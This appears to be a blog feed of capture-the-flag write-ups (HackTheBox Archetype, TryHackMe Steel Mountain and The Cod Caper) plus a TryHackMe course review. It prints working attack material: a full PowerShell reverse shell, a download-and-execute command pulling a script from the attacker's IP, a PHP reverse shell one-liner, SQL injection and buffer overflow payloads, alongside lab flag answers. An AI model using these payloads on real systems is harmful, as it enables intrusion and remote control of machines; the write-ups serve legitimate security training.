    <img src="/images/htb/archetype/sql.png"  class="center"  style="border-radius: 8px;"  />


<p>Now we need to enable code execution in this server:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>Show Advanced Options<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>;
reconfigure;
sp_configure;
EXEC sp_configure <span style="color:#960050;background-color:#1e0010">&#39;</span>xp_cmdshell<span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">1</span>
reconfigure;
xp_cmdshell <span style="color:#e6db74">&#34;whoami</span>
</code></pre></div><p>With command <code>xp_cmdshell</code>  we&rsquo;re able to run commands.</p>
<h2 id="payload">Payload</h2>
<p>After that let&rsquo;s send a <code>PowerShell</code> payload to reverse shell the target:</p>
<p>Don&rsquo;t forget to edit the first line.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Net.Sockets.TcpClient(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">10.10.16.113</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#ae81ff">443</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>socket <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null){exit <span style="color:#ae81ff">1</span>}
<span style="color:#960050;background-color:#1e0010">$</span>stream <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>socket.GetStream();
<span style="color:#960050;background-color:#1e0010">$</span>writer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.IO.StreamWriter(<span style="color:#960050;background-color:#1e0010">$</span>stream);
<span style="color:#960050;background-color:#1e0010">$</span>buffer <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Byte[] <span style="color:#ae81ff">1024</span>;
<span style="color:#960050;background-color:#1e0010">$</span>encoding <span style="color:#f92672">=</span> new<span style="color:#f92672">-</span>object System.Text.AsciiEncoding;
<span style="color:#66d9ef">do</span>
{
	<span style="color:#960050;background-color:#1e0010">$</span>writer.Flush();
	<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>null;
	<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
	<span style="color:#66d9ef">while</span>(<span style="color:#960050;background-color:#1e0010">$</span>stream.DataAvailable <span style="color:#f92672">-</span>or <span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">-</span>eq <span style="color:#960050;background-color:#1e0010">$</span>null) {
		<span style="color:#960050;background-color:#1e0010">$</span>read <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stream.Read(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>)
	}
	<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>encoding.GetString(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>, <span style="color:#960050;background-color:#1e0010">$</span>read).Replace(<span style="color:#e6db74">&#34;`r`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>).Replace(<span style="color:#e6db74">&#34;`n&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>)){
		<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">-</span>gt <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
			<span style="color:#960050;background-color:#1e0010">$</span>args <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
			<span style="color:#960050;background-color:#1e0010">$</span>out <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>out.substring(<span style="color:#ae81ff">0</span>,<span style="color:#960050;background-color:#1e0010">$</span>out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>));
			<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>args.split(<span style="color:#e6db74">&#39; &#39;</span>).length <span style="color:#f92672">-</span>gt <span style="color:#ae81ff">1</span>){
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.ProcessStartInfo
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.FileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardError <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.RedirectStandardOutput <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>true
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.UseShellExecute <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>false
                <span style="color:#960050;background-color:#1e0010">$</span>pinfo.Arguments <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c $out $args&#34;</span>
                <span style="color:#960050;background-color:#1e0010">$</span>p <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System.Diagnostics.Process
                <span style="color:#960050;background-color:#1e0010">$</span>p.StartInfo <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>pinfo
                <span style="color:#960050;background-color:#1e0010">$</span>p.Start() <span style="color:#f92672">|</span> Out<span style="color:#f92672">-</span>Null
                <span style="color:#960050;background-color:#1e0010">$</span>p.WaitForExit()
                <span style="color:#960050;background-color:#1e0010">$</span>stdout <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardOutput.ReadToEnd()
                <span style="color:#960050;background-color:#1e0010">$</span>stderr <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>p.StandardError.ReadToEnd()
                <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">$</span>p.ExitCode <span style="color:#f92672">-</span>ne <span style="color:#ae81ff">0</span>) {
                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stderr
                } <span style="color:#66d9ef">else</span> {
                    <span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>stdout
                }
			}
			<span style="color:#66d9ef">else</span>{
				<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span> <span style="color:#e6db74">&#34;$args&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
			}
		}
		<span style="color:#66d9ef">else</span>{
			<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;$out&#34;</span>) <span style="color:#f92672">|</span> out<span style="color:#f92672">-</span>string;
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>res <span style="color:#f92672">-</span>ne <span style="color:#960050;background-color:#1e0010">$</span>null){
        <span style="color:#960050;background-color:#1e0010">$</span>writer.WriteLine(<span style="color:#960050;background-color:#1e0010">$</span>res)
    }
	}
}While (<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">$</span>out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>))
<span style="color:#960050;background-color:#1e0010">$</span>writer.close();
<span style="color:#960050;background-color:#1e0010">$</span>socket.close();
<span style="color:#960050;background-color:#1e0010">$</span>stream.Dispose()
</code></pre></div><p>Setup a python web server to host our file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">python3 <span style="color:#f92672">-</span>m http.server <span style="color:#ae81ff">80</span>
</code></pre></div><p>Setup a <code>Netcat</code> for listening:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">nc <span style="color:#f92672">-</span>lvnp <span style="color:#ae81ff">443</span>
ufw allow from <span style="color:#ae81ff">10.10.10.27</span> proto tcp to any port <span style="color:#ae81ff">80</span>,<span style="color:#ae81ff">443</span>
</code></pre></div><p>We have all set up to receive the reverse shell.
We only need to execute the payload in the target and wait for connection into the <code>Netcat</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (New<span style="color:#f92672">-</span>Object Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.16.113/shell2.ps1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">);&#34;</span>
</code></pre></div><p>After that we have the shell:</p>

    <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="first-key">First Key</h2>
<p>For the first key we need to enumerate the files:</p>

    <img src="/images/htb/archetype/key.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="privileged-user-access">Privileged user access</h2>
<p>Now that we have the users' flag, we need to focus on the administrator flag. Maybe the flag is in the administrator’s folder, but our user don&rsquo;t have access. We need to privesc our shell. A very useful checklist to do that:  <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation" target="_blank" >Hacktricks</a>.</p>

    <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />


<p>One interesting point in the checklist is the Power Shell history.</p>
<p>The located path is:
<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
<p>Let&rsquo;s take a look:</p>

    <img src="/images/htb/archetype/history.png"  class="center"  style="border-radius: 8px;"  />


<p>Piece of cake, we have the admin credentials now.</p>
<p>Let&rsquo;s use a <code>psexec</code> with the new credential to connect:</p>

    <img src="/images/htb/archetype/psexec.png"  class="center"  style="border-radius: 8px;"  />


<p>Finally, we can look at the administrator&rsquo;s folder to find the second and last key:</p>

    <img src="/images/htb/archetype/key2.png"  class="center"  style="border-radius: 8px;"  />


<p>

<br>



<br>
</p>

    <img src="/images/htb/archetype/pwnd.png"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - Steel Mountain - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/</link>
            <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/</guid>
            <description>Task 1. Introduction First of all, let&amp;rsquo;s nmap the machine IP.
nmap -sS -A 10.10.169.181 -PnWe found a web service open port (80), let&amp;rsquo;s open the web page:
Take a look at the source code:
Who is the employee of the month?
Bill Harper
Task 2. Inicial Access Scan the machine with nmap. What is the other port running a web server on?
Nmap gives this answer:
8080</description>
            <content type="html"><![CDATA[
    <img src="/images/steelmountain/banner.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-1-introduction">Task 1. Introduction</h2>
<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli"> nmap -sS -A 10.10.169.181 -Pn
</code></pre><p>We found a web service open port (80), let&rsquo;s open the web page:</p>

    <img src="/images/steelmountain/80.png"  class="center"  style="border-radius: 10px;"  />


<p>Take a look at the source code:</p>

    <img src="/images/steelmountain/sourcepage.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>Who is the employee of the month?</strong></p>
<p><code>Bill Harper</code></p>
<h2 id="task-2-inicial-access">Task 2. Inicial Access</h2>

    <img src="/images/steelmountain/task1.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>Scan the machine with nmap. What is the other port running a web server on?</strong></p>
<p>Nmap gives this answer:</p>
<p><code>8080</code></p>
<p><strong>Take a look at the other web server. What file server is running?</strong></p>
<p>Nmap shows: HttpFileServer, google it!</p>
<p><code>Rejetto HTTP File Server</code></p>
<p><strong>What is the CVE number to exploit this file server?</strong></p>
<p><a href="https://www.exploit-db.com/exploits/39161" target="_blank" >https://www.exploit-db.com/exploits/39161</a></p>
<p><code>2014-6287</code></p>
<p><strong>Use Metasploit to get an initial shell. What is the user flag?</strong></p>
<p>Open the msfconsole and search for rejetto:</p>

    <img src="/images/steelmountain/rejetto.png"  class="center"  style="border-radius: 10px;"  />


<p>Configure the exploit options:</p>

    <img src="/images/steelmountain/task1.png"  class="center"  style="border-radius: 10px;"  />


<p>Run the exploit and wait for shell access:</p>

    <img src="/images/steelmountain/exploit.png"  class="center"  style="border-radius: 10px;"  />


<p>Now that we have an initial shell on this Windows machine as Bill, let&rsquo;s search for the key in Bill’s desktop:</p>

    <img src="/images/steelmountain/key.png"  class="center"  style="border-radius: 10px;"  />


<p><code>b04763b6fcf51fcd7c13abc7db4fd365</code></p>
<h2 id="task-3-privilege-escalation">Task 3. Privilege Escalation</h2>
<p>We need to enumerate this system, we&rsquo;re going to use a <code>PowerShell</code> script called <code>PowerUp</code>.</p>



<blockquote>

"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
</blockquote>

<p>You can download the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" >here</a>. Now you can use the upload command in Metasploit to upload the script.</p>

    <img src="/images/steelmountain/powerup.png"  class="center"  style="border-radius: 8px;"  />


<p>Let&rsquo;s load the <code>PowerShell</code> module in meterpreter:</p>
<pre tabindex="0"><code>load powershell
</code></pre><p>Then run:</p>
<pre tabindex="0"><code>powershell_shell
</code></pre><p>This will open a PowerShell session, after that ruin the script and use: <code>Invoke-Allchecks</code>
Look at the results and search for True in the <code>Can Restart</code> option:</p>

    <img src="/images/steelmountain/canrestart.png"  class="center"  style="border-radius: 8px;"  />


<p>Search to the CanRestart option that is set to true.</p>
<p><strong>What is the name of the service which shows up as an unquoted service path vulnerability?</strong></p>
<p><code>AdvancedSystemCareService9</code></p>
<p>Now let&rsquo;s configure the <code>.exe</code> with <code>msfvenom</code>:</p>

    <img src="/images/steelmountain/msfvenom.png"  class="center"  style="border-radius: 8px;"  />


<p>Then upload the file to <code>Iobit</code> folder:</p>

    <img src="/images/steelmountain/iobit.png"  class="center"  style="border-radius: 8px;"  />


<p>Preparing the <code>netcat</code>:</p>

    <img src="/images/steelmountain/netcat.png"  class="center"  style="border-radius: 8px;"  />


<p>After that, stop the service <code>AdvancedSystemCareService9</code>, then copy the <code>Advanced.exe</code> to the “Advanced SystemCare” folder, now we should start the <code>AdvancedSystemCareService9</code> again.</p>
<p>Take a look at your netcat connection:</p>

    <img src="/images/steelmountain/netcat2.png"  class="center"  style="border-radius: 8px;"  />


<p>We have an administrator shell, search for the key in the Administrator&rsquo;s folder.</p>
<p><strong>What is the root flag ?</strong></p>
<p><code>9af5f314f57607c00fd09803a587db80</code></p>
]]></content>
        </item>
        
        <item>
            <title>TryHackme - Pre-Security Path - Review</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</link>
            <pubDate>Fri, 09 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</guid>
            <description>Ever dreamt of becoming a hacker or an IT professional? Or perhaps, you&amp;rsquo;re simply intrigued by technology. If you&amp;rsquo;re unsure where to begin, Try Hack Me is the perfect starting point for you!
Dive right into the new Pre Security Learning Path.
No prior IT experience? No problem! This learning path is designed to gently introduce you to the world of cyber security. Here&amp;rsquo;s a glimpse of what you&amp;rsquo;ll discover:</description>
            <content type="html"><![CDATA[
    <img src="/images/presec/banner.jpg"  class="center"  style="border-radius: 10px;"  />


<p>Ever dreamt of becoming a hacker or an IT professional? Or perhaps, you&rsquo;re simply intrigued by technology. If you&rsquo;re unsure where to begin, Try Hack Me is the perfect starting point for you!</p>
<p>Dive right into the new Pre Security Learning Path.</p>

    <img src="/images/presec/presec.JPG"  class="center"  style="border-radius: 10px;"  />


<p>No prior IT experience? No problem! This learning path is designed to gently introduce you to the world of cyber security. Here&rsquo;s a glimpse of what you&rsquo;ll discover:</p>
<p>


<ul>
<li>Basics of Cyber Security</li>
<li>Networking Fundamentals</li>
<li>Common Web Attacks</li>
<li>Utilizing Linux and Windows Operating Systems</li>
</ul>

First and foremost, create your account on Try Hack Me. Don&rsquo;t miss out – it&rsquo;s free!</p>

    <img src="/images/presec/try.JPG"  class="center"  style="border-radius: 10px;"  />


<p>What sets THM apart is its engaging methodology. It feels more like playing a game than traditional learning. Forget tedious readings! THM delivers knowledge in a captivating and enjoyable manner. Every learning path on THM includes hands-on exercises and virtual labs.</p>

    <img src="/images/presec/mando.gif"  class="center"  style="border-radius: 10px;"  />


<p>In the Linux and Windows fundamentals, you even get the chance to launch a virtual machine directly within your browser, turning learning into a hands-on experience.</p>

    <img src="/images/presec/machine.JPG"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/kevin.gif"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/linux2.JPG"  class="center"  style="border-radius: 10px;"  />


<p>Upon completing the Pre-Security path, you&rsquo;ll earn a prestigious THM certificate:</p>

    <img src="/images/presec/thm.png"  class="center"  style="border-radius: 10px;"  />


<p>But the journey doesn&rsquo;t stop there. Chart your path forward. While Pre-Security is an excellent starting point for beginners, THM offers more advanced paths for you to explore:</p>

    <img src="/images/presec/roadmap.JPG"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/presec/hackerman.gif"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - The Cod Caper - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</link>
            <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</guid>
            <description>Task 1. Intro This is a write up for &amp;ldquo;The Cod Caper&amp;rdquo; room at Try Hack Me.
Room&amp;rsquo;s intro note:
Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server.</description>
            <content type="html"><![CDATA[
    <img src="/images/thecodcaper/novo.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-1-intro">Task 1. Intro</h2>
<p>This is a write up for &ldquo;The Cod Caper&rdquo; <a href="https://tryhackme.com/room/thecodcaper" target="_blank" >room</a> at Try Hack Me.</p>
<p>Room&rsquo;s intro note:</p>



<blockquote>

Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.
</blockquote>

<h2 id="task-2-host-enumeration">Task 2. Host Enumeration</h2>
<p>First of all let&rsquo;s <code>nmap</code> the machine IP.</p>
<p>We&rsquo;re going to scan port 1 to 1000 as suggested in the task.</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli"> nmap -v -A -sC -p 1-100  10.10.41.158
</code></pre><p>Flags used:</p>
<p><code>-p 1–1000”</code> = Used to specify which port to analyze, can also be used to specify a range of ports.</p>
<p><code>-sC</code> = Runs default scripts on the port, useful for doing basic analysis on the service running on a port.</p>
<p><code>-A</code> = Aggressive mode, go all out and try to get as much information as possible.</p>
<p>We found 2 open ports, just pay attention to the nmap results, all answers for the first task are there.</p>
<h2 id="task-3-web-enumeration">Task 3. Web Enumeration</h2>
<p>Let&rsquo;s search for files and directories.</p>
<p>You may use <code>gobuster</code> for that, but I would particularly go with my bash script. You can download my script <a href="http:/https://github.com/nmmorette/bash-scripts/blob/25f02fa424136f0d23090072a773892e19c5c5b2/webrecon.sh/" target="_blank" >here</a>
Edit the file with a wordlist of your preference. I suggest the big.txt from <code>dirb</code>.</p>
<p>Execute the <code>.\webrecon.sh</code> script in the target:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">  .<span style="color:#ae81ff">\w</span>ebrecon.sh TARGET_IP
</code></pre></div><p>If you like to use use <code>gobuster</code>:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli">  gobuster dir --url TARGET_IP --wordlist /usr/share/wordlists/dirb/big.txt -x &quot;php,txt,html&quot; | grep 200
</code></pre><p>The  <code>| grep 200</code> is for filter the results only for http 200 code.</p>

    <img src="/images/thecodcaper/gobuster.JPG"  class="center"  style="border-radius: 5px;"  />


<p>Both modes will lead us to a <code>.php</code> file with an &ldquo;Administrator Login&rdquo; web page.</p>

    <img src="/images/thecodcaper/admin.JPG"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-4-web-exploitation">Task 4. Web Exploitation</h2>
<p>Now we have an administrator page but we don&rsquo;t have credentials to log in. So let&rsquo;s try some SQL injection using the  <code>sqlmap</code>.</p>

    <img src="/images/thecodcaper/sql.jpg"  class="center"  style="border-radius: 8px;"  />


<pre tabindex="0"><code class="language-cli" data-lang="cli">  sqlmap -u http://10.10.41.158/administrator.php --forms --dump
</code></pre><p>Flags used:</p>
<p><code>-u</code> = Specifies which url to attack.</p>
<p><code>--forms</code> = Automatically selects parameters from <!-- raw HTML omitted --> elements on the page.</p>
<p><code>--dump</code> = Used to retrieve data from the db once SQLI is found.</p>
<p>As result we got a username and a pass:</p>

    <img src="/images/thecodcaper/cred.jpg"  class="center"  style="border-radius: 8px;"  />


<p>Finally we can login into <code>/administrator.php</code> page then we get a &ldquo;Run Command&rdquo; page:</p>

    <img src="/images/thecodcaper/run.jpg"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-5-command-execution">Task 5. Command Execution</h2>
<p>Since we have a form to run commands, let&rsquo;s run some basic command as <code>ls</code></p>
<p>It&rsquo;s working!! 
We have the result:</p>

    <img src="/images/thecodcaper/files.jpg"  class="center"  style="border-radius: 8px;"  />


<p>That command give us the answer for the first question in the task</p>
<p>With the ability to run commands we should try some reverse shell.
We know that server uses <code>php</code> then let&rsquo;s try a <code>php</code> reverse shell on it.
This is one way, but feel free to try another kind of reverse shell: python or nc.
Net Cat will probably works too, since the intro of that particular task told us that the server has nc enable.</p>
<p>We need to open a port in our machine:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli">nc -vnlp 12345
</code></pre><p>Php reverse shell sintax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;OUR_MACHINE_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</code></pre></div><p>Edit the command above with the your machine ip and port, then copy and past to &ldquo;Run Command&rdquo; web page</p>
<p>Now we have a shell in the atacked machine we need a little bit of enumeration. Since we know that user  and we need to find more information about the users.</p>
<p>Lets check the <code>/home</code> directory:</p>

    <img src="/images/thecodcaper/home.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We also can check in the <code>/etc/passwd</code>:</p>

    <img src="/images/thecodcaper/passwd.jpg"  class="center"  style="border-radius:15px;"  />


<p>After this, you will have to do some additional enumeration to find user&rsquo;s ssh key, or hidden password</p>
<p>We can check all files from the user with the command:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli">  find / -user pingu -print 2&gt;/dev/null
</code></pre><p>Also we can search for file names like: pass, secret, private etc&hellip;.</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli">    find / -name pass* 2&gt;/dev/null
</code></pre><p>Take a good look at the results and find the file with user&rsquo;s password. 
You can also search for a <code>ssh</code> key file.</p>
<h2 id="task-6-linenum">Task 6. LinEnum</h2>
<p>We have a user/pass then we should <code>ssh</code> the machine.</p>

    <img src="/images/thecodcaper/ssh.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We&rsquo;re logged in the user machine, however we need to find possibles ways to priv esc. Let&rsquo;s go with LinEnum.</p>


<blockquote>
LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.

</blockquote>


<p>Let&rsquo;s copy the <a href="https://github.com/rebootuser/LinEnum" target="_blank" >Linenum</a> scritp:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli"> scp {path to linenum} {user}@{host}:{path}
</code></pre><p>After that, run <code>linenum.sh</code></p>
<p>Go to SUID files section and find the answer to task 6 only question.</p>

    <img src="/images/thecodcaper/su.JPG"  class="center"  style="border-radius: 8px;"  />


<h2 id="task-7-pwndbg">Task 7. pwndbg</h2>
<p>We found an interesting file in the step above, moreover as explained in Tryhackme,this file expects 32 characters in the input now we used <code>gdb</code> to analyze.</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli">   gdb /opt/secret/root
</code></pre>
    <img src="/images/thecodcaper/gbd.jpg"  class="center"  style="border-radius: 8px;"  />


<p>The <code>pwndbg</code> has successfully been initialized. The next phase is to test if anything happens when we send more then 32 characters.</p>
<p>Type:</p>
<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">  r &lt; &lt;(cyclic 50)
</code></pre><p>That command runs the program and provides 50 characters worth of &ldquo;cyclic&rdquo; input.
After running this command you will see something like this:</p>
<p>
    <img src="/images/thecodcaper/secret.jpg"  class="center"  style="border-radius: 8px;"  />




<blockquote>
Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time.*

*Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP.
</blockquote>

Luckily cyclic provides this functionality with the -l flag, running <code>cyclic -l {fault address}</code> will tell us exactly how many characters we need to provide we can overwrite EIP.&quot;</p>
<p>Running:</p>
<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">     cyclic -l 0x6161616c 
</code></pre><p>Outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.</p>
<p>That&rsquo;s all we needed for pre-explotation!</p>
<h2 id="task-8-binary-exploitation-manually--9-the-pwntools-way">Task 8. Binary-Exploitation: Manually | 9. The pwntools way</h2>
<p>These two steps lead us to the same result, we&rsquo;re going with step 8 pass in this write up, but feel free to try the pwntools way.</p>


<blockquote>
Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up
</blockquote>

<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">        disassemble shell 
</code></pre>

<blockquote>
What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
</blockquote>

<p>We can use python to do this:</p>
<p>Python conversion:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">     python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;</span>
</code></pre></div>

<blockquote>

The command above  will output the payload we want, but it requires manually converting to little endian.
We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary*

</blockquote>

